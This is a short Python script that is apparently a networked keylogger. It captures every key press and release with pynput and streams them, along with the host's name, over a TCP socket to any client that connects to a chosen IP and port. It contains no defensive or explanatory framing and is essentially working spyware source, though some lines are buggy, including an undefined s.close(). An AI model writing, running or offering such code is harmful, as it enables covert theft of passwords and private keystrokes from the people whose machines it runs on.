import socket
import threading
import datetime
import time
from pynput.keyboard import Key, Listener
threads = []
com = ["s"]

def on_press(key):
	if(len(com) < 1):
		com.pop()
	com.append('press {0}'.format(key))

def on_release(key):
	if(len(com) < 1):
		com.pop()
	com.append('release {0}'.format(key))
	if key == Key.esc:
		return False
def Listen():
	# Collect events until released
	with Listener(on_press=on_press,on_release=on_release) as listener:listener.join()

def clientThread(clients, add):
	clients.send(("Connected to: " + socket.gethostname()) .encode())
	a = com[-1] 
	while True:
		if com[-1] != a:
			clients.send( (com[-1]).encode())
			a= com[-1]
sock = input("Input server IP address: ")
port = int(input("Input port number: "))
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversocket.bind((sock, port))
serversocket.listen(5)

keyboardCallback = threading.Thread(target = Listen)
keyboardCallback.start()
while True:
	(clientsocket, address) = serversocket.accept()
	print("accepted connection from" + str(address))
	t = threading.Thread(target = clientThread, args =(clientsocket, address))
	threads.append(t)
	t.start()
s.close()
